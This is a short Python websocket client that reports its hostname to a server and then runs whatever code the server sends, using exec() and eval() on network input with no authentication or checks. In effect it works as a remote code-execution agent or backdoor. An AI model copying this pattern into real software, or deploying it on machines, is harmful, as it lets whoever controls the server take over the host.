import asyncio
import websockets
import platform
import json

try:
    from config import config
except ImportError:
    config = {"uri": "ws://localhost:8765"}


async def main():
    reg_data = json.dumps({"hostname": platform.node()})
    async with websockets.connect(config["uri"]) as websocket:
        await websocket.send(reg_data)
        state = {}
        while True:
            state["result"] = None
            state["error"] = None
            try:
                payload = json.loads(await websocket.recv())
                exec(payload["script"])
                eval(payload["init_method"])(state, *payload["args"])
            except Exception as e:
                state["error"] = repr(e)
            await websocket.send(json.dumps({"result": state["result"], "error": state["error"]}))


if __name__ == "__main__":
    asyncio.get_event_loop().run_until_complete(main())